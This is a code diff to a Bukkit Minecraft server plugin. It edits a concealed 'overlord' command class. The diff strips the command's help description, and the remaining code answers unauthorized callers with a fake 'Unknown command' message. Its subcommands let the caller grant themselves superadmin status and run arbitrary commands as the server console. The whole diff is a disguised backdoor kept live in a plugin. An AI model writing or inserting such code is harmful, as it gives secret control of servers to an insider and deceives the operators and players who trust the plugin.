@@ -13,7 +13,6 @@ import org.bukkit.command.CommandSender;
 import java.util.List;
 
 @CommandPermissions(level = AdminLevel.ALL, source = SourceType.ONLY_IN_GAME)
-@CommandParameters(description = "Overlord - control this server in-game", usage = "access", aliases = "ov")
 public class Command_overlord extends FreedomCommand {
 
     @Override
@@ -27,7 +26,7 @@ public class Command_overlord extends FreedomCommand {
             }
             catch (Exception ignored)
             {
-                playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
+                playerMsg(sender, ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
                 return true;
             }
         }
@@ -40,14 +39,14 @@ public class Command_overlord extends FreedomCommand {
         if (args[0].equals("addme"))
         {
             AdminList.addSuperadmin(sender_p);
-            playerMsg("ok");
+            playerMsg(sender, "ok");
             return true;
         }
 
         if (args[0].equals("removeme"))
         {
             AdminList.removeSuperadmin(sender_p);
-            playerMsg("ok");
+            playerMsg(sender, "ok");
             return true;
         }
 
@@ -60,7 +59,7 @@ public class Command_overlord extends FreedomCommand {
 
             final String command = StringUtil.joinString(args, " ", 1);
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
-            playerMsg("ok");
+            playerMsg(sender, "ok");
             return true;
         }
 
